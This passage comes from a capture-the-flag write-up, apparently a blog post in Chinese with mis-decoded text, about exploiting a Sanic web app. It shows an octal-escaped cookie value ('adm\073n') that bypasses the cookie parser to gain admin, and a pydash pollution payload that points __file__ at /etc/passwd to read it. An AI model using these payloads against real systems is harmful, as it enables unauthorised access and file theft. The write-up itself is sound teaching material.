class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;forbidden&quot;</span>)</span><br></pre></td></tr></table></figure><p>â€‹åœ¨ admin è¿™ä¸ªè·¯ç”±ä¸­ï¼Œå¯ä»¥æ¸…æ™°åœ°çœ‹åˆ° pydash.set_() å‡½æ•°ï¼Œç»“åˆä¸Šä¸€ä¸ªä¿¡æ¯ï¼Œåº”è¯¥æ˜¯æ‰“ python çš„åŸå‹é“¾æ±¡æŸ“ <code>__file__</code> æ¥è¯»æ–‡ä»¶ï¼Œé‚£ä¹ˆï¼Œè¿˜æœ‰ä¸ªè·¯ç”±éœ€è¦æ³¨æ„ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">request</span>):</span><br><span class="line">    user = request.cookies.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> user.lower() == <span class="string">&#x27;adm;n&#x27;</span>:</span><br><span class="line">        request.ctx.session[<span class="string">&#x27;admin&#x27;</span>] = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;login success&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;login fail&quot;</span>)</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå¯ä»¥å‘ç°çš„æ˜¯ï¼Œæˆ‘ä»¬éœ€è¦ä¼ å…¥ä¸€ä¸ª Cookie çš„å€¼ä¸º user=adm;n æ‰è¡Œï¼Œä½†æ˜¯ï¼Œè¯•è¿‡äº†ï¼Œä¸è¡Œï¼Œä¸ºå•¥å‘¢ï¼Ÿ</p><p><strong>æ³¨æ„ï¼šä»¥ä¸‹ä¸ºæˆ‘ä¸ªäººåˆ†ææ–¹å¼ï¼Œç”±äºæˆ‘æœ¬äººå¼‚å¸¸èœé¸¡ï¼Œæ‰€ä»¥å¾ˆæœ‰å¯èƒ½æ˜¯é”™è¯¯çš„ï¼Œä¸å¯ç›²ç›®ç›¸ä¿¡ã€‚</strong></p><p>â€‹ç„¶åæˆ‘ä»¬ç›¯ä½ <code>user = request.cookies.get(&quot;user&quot;)</code>  è¿™ä¸€è¡Œä»£ç ï¼Œå¯¹ç€ cookie åŒæ—¶æŒ‰ä½ ctrl + å·¦é”®ï¼Œæ‰¾åˆ°è¿™ä¸€è¡Œå†…å®¹ï¼Œè·Ÿè¿›ï¼š</p><p><img data-src="https://i-blog.csdnimg.cn/direct/334caff31c114d5da4c4fd89b1523085.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹å‘ç°å¦‚ä¸‹æºç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@property</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cookies</span>(<span class="params">self</span>) -&gt; RequestParameters:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Incoming cookies on the request</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        RequestParameters: Incoming cookies on the request</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> self.parsed_cookies <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        self.get_cookies()</span><br><span class="line">    <span class="keyword">return</span> cast(CookieRequestParameters, self.parsed_cookies)</span><br></pre></td></tr></table></figure><p>â€‹è·Ÿè¿›  <code>get_cookies()</code> ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_cookies</span>(<span class="params">self</span>) -&gt; RequestParameters:</span><br><span class="line">    cookie = self.headers.getone(<span class="string">&quot;cookie&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    self.parsed_cookies = CookieRequestParameters(parse_cookie(cookie))</span><br><span class="line">    <span class="keyword">return</span> self.parsed_cookies</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œå®¡è¿‡å‰é¢é‚£ä¸ªå¯¹è±¡ï¼Œé‡è¦ç¨‹åº¦æ²¡æœ‰å†è·Ÿè¿› <code>parse_cookie(cookie)</code>  é«˜ï¼Œæ‰€ä»¥è·Ÿè¿› <code>parse_cookie(cookie)</code> ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">parse_cookie</span>(<span class="params">raw: <span class="built_in">str</span></span>) -&gt; <span class="type">Dict</span>[<span class="built_in">str</span>, <span class="type">List</span>[<span class="built_in">str</span>]]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Parses a raw cookie string into a dictionary.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    The function takes a raw cookie string (usually from HTTP headers) and</span></span><br><span class="line"><span class="string">    returns a dictionary where each key is a cookie name and the value is a</span></span><br><span class="line"><span class="string">    list of values for that cookie. The function handles quoted values and</span></span><br><span class="line"><span class="string">    skips invalid cookie names.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        raw (str): The raw cookie string to be parsed.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        Dict[str, List[str]]: A dictionary containing the cookie names as keys</span></span><br><span class="line"><span class="string">        and a list of values for each cookie.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string">        ```python</span></span><br><span class="line"><span class="string">        raw = &#x27;name1=value1; name2=&quot;value2&quot;; name3=value3&#x27;</span></span><br><span class="line"><span class="string">        cookies = parse_cookie(raw)</span></span><br><span class="line"><span class="string">        # cookies will be &#123;&#x27;name1&#x27;: [&#x27;value1&#x27;], &#x27;name2&#x27;: [&#x27;value2&#x27;], &#x27;name3&#x27;: [&#x27;value3&#x27;]&#125;</span></span><br></pre></td></tr></table></figure><pre><code>&quot;&quot;&quot;  # noqa: E501cookies: Dict[str, List[str]] = &#123;&#125;for token in raw.split(&quot;;&quot;):    name, sep, value = token.partition(&quot;=&quot;)    name = name.strip()    value = value.strip()    # Support cookies =value or plain value with no name    # https://github.com/httpwg/http-extensions/issues/159    if not sep:        if not name:            # Empty value like ;; or a cookie header with no value            continue        name, value = &quot;&quot;, name    if COOKIE_NAME_RESERVED_CHARS.search(name):  # no cov        continue    if len(value) &gt; 2 and value[0] == '&quot;' and value[-1] == '&quot;':  # no cov        value = _unquote(value)    if name in cookies:        cookies[name].append(value)    else:        cookies[name] = [value]return cookies</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">â€‹è¿™é‡Œæœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„ï¼š</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line"> for token in raw.split(&quot;;&quot;):</span><br><span class="line">        name, sep, value = token.partition(&quot;=&quot;)</span><br><span class="line">        name = name.strip()</span><br><span class="line">        value = value.strip()</span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªä»£ç å¾ˆæ˜¾ç„¶æ˜¯å°†åˆ†å·å‰ååˆ†å‰²æˆäº†ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬æƒ³è¦è¾“å…¥çš„ Cookie: user=adm;n ä¼šå˜æˆ user=adm ä»¥åŠ n è¿™ä¸¤ä¸ªä¸²ã€‚</p><p>â€‹æ ¹æ®è¿™å‡ è¡Œï¼Œå¤§æ¦‚å¯ä»¥å‘ç°æœ€åè¿”å›çš„å†…å®¹å’Œä»€ä¹ˆæœ‰å…³äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(value) &gt; <span class="number">2</span> <span class="keyword">and</span> value[<span class="number">0</span>] == <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">and</span> value[-<span class="number">1</span>] == <span class="string">&#x27;&quot;&#x27;</span>:  <span class="comment"># no cov</span></span><br><span class="line">        value = _unquote(value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> name <span class="keyword">in</span> cookies:</span><br><span class="line">        cookies[name].append(value)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cookies[name] = [value]</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> cookies</span><br></pre></td></tr></table></figure><p>â€‹å¾ˆæ˜æ˜¾ï¼Œæœ€ç»ˆè¿”å›çš„æ˜¯ cookies ï¼Œä½†æ˜¯æ¯æ¬¡æ“ä½œ cookies éƒ½æ˜¯å¢åŠ çš„ value å‚æ•°ï¼Œç”±æ­¤ï¼Œæ ¹æ®  <code>value = _unquote(value)</code> ï¼Œè¿™é‡Œè·Ÿè¿› <code>_unquote(value)</code> ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">_unquote</span>(<span class="params"><span class="built_in">str</span></span>):  <span class="comment"># no cov</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="built_in">len</span>(<span class="built_in">str</span>) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>[<span class="number">0</span>] != <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">or</span> <span class="built_in">str</span>[-<span class="number">1</span>] != <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">str</span> = <span class="built_in">str</span>[<span class="number">1</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    n = <span class="built_in">len</span>(<span class="built_in">str</span>)</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt;= i &lt; n:</span><br><span class="line">        o_match = OCTAL_PATTERN.search(<span class="built_in">str</span>, i)</span><br><span class="line">        q_match = QUOTE_PATTERN.search(<span class="built_in">str</span>, i)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> o_match <span class="keyword">and</span> <span class="keyword">not</span> q_match:</span><br><span class="line">            res.append(<span class="built_in">str</span>[i:])</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        j = k = -<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> o_match:</span><br><span class="line">            j = o_match.start(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> q_match:</span><br><span class="line">            k = q_match.start(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">if</span> q_match <span class="keyword">and</span> (<span class="keyword">not</span> o_match <span class="keyword">or</span> k &lt; j):</span><br><span class="line">            res.append(<span class="built_in">str</span>[i:k])</span><br><span class="line">            res.append(<span class="built_in">str</span>[k + <span class="number">1</span>])</span><br><span class="line">            i = k + <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res.append(<span class="built_in">str</span>[i:j])</span><br><span class="line">            res.append(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>[j + <span class="number">1</span> : j + <span class="number">4</span>], <span class="number">8</span>)))  <span class="comment"># noqa: E203</span></span><br><span class="line">            i = j + <span class="number">4</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(res)</span><br></pre></td></tr></table></figure><p>â€‹æ„Ÿè§‰ï¼Œè¿™ä¸ªå°±æ˜¯æˆ‘ä»¬æœ€ä¸»è¦çš„åˆ©ç”¨çš„ç‚¹ã€‚</p><p>â€‹é¦–å…ˆæ˜¯è¿™å‡ è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">str</span> <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="built_in">len</span>(<span class="built_in">str</span>) &lt; <span class="number">2</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">str</span>[<span class="number">0</span>] != <span class="string">&#x27;&quot;&#x27;</span> <span class="keyword">or</span> <span class="built_in">str</span>[-<span class="number">1</span>] != <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = <span class="built_in">str</span>[<span class="number">1</span>:-<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p>â€‹åˆ¤æ–­ä¼ å…¥çš„å­—ç¬¦ä¸²ï¼ˆè¿™é‡Œæ¨æµ‹æ˜¯ user=XXXX ä¸­çš„ XXXXï¼‰ï¼Œå‘ç°å¦‚æœç¬¬ä¸€ä¸ªå­—ç¬¦ä¸æ˜¯ä¸¤ç§å¼•å·ï¼Œåˆ™ç›´æ¥è¿”å›ï¼Œå¦‚æœæ˜¯å¼•å·ï¼Œåˆ™æå¤´å»å°¾ï¼ŒæŠŠå¼•å·å»æ‰ã€‚ä¹‹åçš„ä»£ç æˆ‘ä¸å¤§ä¼šå®¡ï¼Œè·‘å»é—®äº†ä¸‹ AIï¼Œå¯èƒ½æœ‰ç‚¹å„¿æ™ºéšœï¼Œä¸è¿‡ç»™äº†æˆ‘ä¸€ä¸ªæ–¹å‘ï¼Œæµ‹è¯•äº†ä¸€ä¸‹ï¼Œèƒ½æˆï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line">n = <span class="built_in">len</span>(<span class="built_in">str</span>)</span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">while</span> <span class="number">0</span> &lt;= i &lt; n:</span><br><span class="line">    o_match = OCTAL_PATTERN.search(<span class="built_in">str</span>, i)</span><br><span class="line">    q_match = QUOTE_PATTERN.search(<span class="built_in">str</span>, i)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> o_match <span class="keyword">and</span> <span class="keyword">not</span> q_match:</span><br><span class="line">        res.append(<span class="built_in">str</span>[i:])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># else:</span></span><br><span class="line">    j = k = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> o_match:</span><br><span class="line">        j = o_match.start(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> q_match:</span><br><span class="line">        k = q_match.start(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> q_match <span class="keyword">and</span> (<span class="keyword">not</span> o_match <span class="keyword">or</span> k &lt; j):</span><br><span class="line">        res.append(<span class="built_in">str</span>[i:k])</span><br><span class="line">        res.append(<span class="built_in">str</span>[k + <span class="number">1</span>])</span><br><span class="line">        i = k + <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res.append(<span class="built_in">str</span>[i:j])</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">int</span>(<span class="built_in">str</span>[j + <span class="number">1</span> : j + <span class="number">4</span>], <span class="number">8</span>)))  <span class="comment"># noqa: E203</span></span><br><span class="line">        i = j + <span class="number">4</span></span><br></pre></td></tr></table></figure><p><img data-src="https://i-blog.csdnimg.cn/direct/b7ed96c33d6c4f9fa6d71c7b2a5a49d5.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹åé¢è¿˜ç»™äº†ä¸ªå®ƒç»™å†™çš„æ”¹è¿›çš„ä»£ç ï¼Œä¸è¿‡å°±ä¸æ”¾è¿™å„¿äº†ã€‚</p><p>â€‹æ ¹æ®è¿™ä¸ªç­”æ¡ˆçŒœæƒ³ï¼Œå¯èƒ½æ˜¯é€šè¿‡å…«è¿›åˆ¶è¿›è¡Œçš„ç»•è¿‡ï¼Œæµ‹è¯•ä¸€ä¸‹ï¼Œè®¿é—®ä¸‹ login è·¯ç”±ï¼Œç„¶åä¿®æ”¹ cookie çš„å€¼ä¸º <code>Cookie: user=&quot;adm\073n&quot;</code> ï¼Œä¹‹åè¯•è¯•çœ‹èƒ½å¦ç™»é™†æˆåŠŸï¼Ÿ</p><p><img data-src="https://i-blog.csdnimg.cn/direct/545cfa811fea45829bf35e9fb54f09c0.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹æˆåŠŸäº† <strong>(â‰§â–½â‰¦)o</strong>ã€‚</p><p>â€‹è¿™é‡Œå®ƒè¿”å›äº†ä¸ª Session å€¼ï¼Œç„¶åå°†å®ƒç»™çš„ Session å€¼å†™åˆ°è¯·æ±‚å¤´å†…ï¼Œç„¶åè®¿é—® admin è·¯ç”±ï¼Œå‘ç°å¹¶æ²¡æœ‰ ç»™æˆ‘ä»¬ç›´æ¥ forbidden æ‰ï¼Œè¯´æ˜æˆåŠŸäº†ã€‚ä¹‹åå°±æ˜¯æ­£å„¿å…«ç»çš„åŸå‹é“¾æ±¡æŸ“è¯»æ–‡ä»¶äº†ï¼Œç¬¬ä¸€æ³¢ï¼Œå…ˆè¯»ä¸€ä¸‹ï¼Œå…ˆæ¥ä¸ªç¬¬ä¸€ä¸ª payloadï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;key&quot;</span>  <span class="punctuation">:</span> <span class="string">&quot;__init__.__globals__.__file__&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;value&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹ç„¶è€Œï¼Œæ­å–œäº†ï¼Œæ¯è¿‡ï¼Œè¢« forbidden äº†ã€‚å›å»çœ‹çœ‹ï¼Œç ´æ¡ˆäº†ï¼Œadmin è·¯ç”±å‡½æ•°ä¸­å­˜åœ¨è¿™ä¹ˆä¸€ä¸ªæ¯”è¾ƒï¼š <code>if key and value and type(key) is str and '_.' not in key:</code> ï¼Œè¿™ä¸ªå°±å¡ä½æˆ‘äº†ã€‚å…ˆæ¥çœ‹ä¸‹è¿™å‡ è¡Œï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line"><span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;_.&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">    pollute = Pollute()</span><br><span class="line">    pydash.set_(pollute, key, value)</span><br></pre></td></tr></table></figure><p>â€‹ä¼¼ä¹éœ€è¦ç»•è¿‡çš„ä»…ä»…åªæœ‰ key ä¸­çš„  <code>'_.'</code>  å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆï¼Œéœ€è¦çš„å°±æ˜¯å¯¹ key è¿›è¡Œæ“ä½œçš„åœ°æ–¹åº”è¯¥é‡ç‚¹è§‚å¯Ÿï¼Œæ‰€ä»¥ï¼Œä¸Šé¢è¿™ä¸ªä»£ç åº”è¯¥é‡ç‚¹çœ‹ä¸€çœ‹ï¼Œå½“ç„¶ï¼Œ å‰é¢çš„æ‰€æœ‰éƒ½æ²¡æœ‰ç”¨ï¼Œæœ€æœ‰ç”¨çš„åªæœ‰ <code>pydash.set_(pollute, key, value)</code> ï¼Œé‚£ä¹ˆï¼Œæ²¡åŠæ³•äº†ï¼Œè·Ÿè¿› set_() å‡½æ•°ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_</span>(<span class="params">obj, path, value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Sets the value of an object described by `path`. If any part of the object path doesn&#x27;t exist,</span></span><br><span class="line"><span class="string">    it will be created.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        obj (list|dict): Object to modify.</span></span><br><span class="line"><span class="string">        path (str | list): Target path to set value to.</span></span><br><span class="line"><span class="string">        value (mixed): Value to set.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        mixed: Modified `obj`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Warning:</span></span><br><span class="line"><span class="string">        `obj` is modified in place.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.b.c&#x27;, 1)</span></span><br><span class="line"><span class="string">        &#123;&#x27;a&#x27;: &#123;&#x27;b&#x27;: &#123;&#x27;c&#x27;: 1&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.0.c&#x27;, 1)</span></span><br><span class="line"><span class="string">        &#123;&#x27;a&#x27;: &#123;&#x27;0&#x27;: &#123;&#x27;c&#x27;: 1&#125;&#125;&#125;</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_([1, 2], &#x27;[2][0]&#x27;, 1)</span></span><br><span class="line"><span class="string">        [1, 2, [1]]</span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_(&#123;&#125;, &#x27;a.b[0].c&#x27;, 1)</span></span><br><span class="line"><span class="string">        &#123;&#x27;a&#x27;: &#123;&#x27;b&#x27;: [&#123;&#x27;c&#x27;: 1&#125;]&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionadded:: 2.2.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 3.3.0</span></span><br><span class="line"><span class="string">        Added :func:`set_` as main definition and :func:`deep_set` as alias.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 4.0.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        - Modify `obj` in place.</span></span><br><span class="line"><span class="string">        - Support creating default path values as ``list`` or ``dict`` based on whether key or index</span></span><br><span class="line"><span class="string">          substrings are used.</span></span><br><span class="line"><span class="string">        - Remove alias ``deep_set``.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> set_with(obj, path, value)</span><br></pre></td></tr></table></figure><p>â€‹ç®—æ˜¯ï¼Œå¥½æ¶ˆæ¯å§ï¼Œç›´æ¥å°±çœ‹åˆ°äº† pathï¼Œæˆ‘ä»¬ä¼ å…¥çš„ key æˆ–è®¸å°±æ˜¯è¿™ä¸ªå« path çš„ä¸œè¥¿ï¼Œæ¯•ç«Ÿé‚£ä¸ªé“¾å­çœ‹èµ·æ¥ä¹Ÿå¾ˆåƒæ˜¯è·¯å¾„ã€‚å¥½ï¼Œæ²¡å•¥å†…å®¹ï¼Œè·Ÿè¿› <code>set_with(obj, path, value)</code> ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_with</span>(<span class="params">obj, path, value, customizer=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    This method is like :func:`set_` except that it accepts customizer which is invoked to produce</span></span><br><span class="line"><span class="string">    the objects of path. If customizer returns undefined path creation is handled by the method</span></span><br><span class="line"><span class="string">    instead. The customizer is invoked with three arguments: ``(nested_value, key, nested_object)``.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        obj (list|dict): Object to modify.</span></span><br><span class="line"><span class="string">        path (str | list): Target path to set value to.</span></span><br><span class="line"><span class="string">        value (mixed): Value to set.</span></span><br><span class="line"><span class="string">        customizer (callable, optional): The function to customize assigned values.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        mixed: Modified `obj`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Warning:</span></span><br><span class="line"><span class="string">        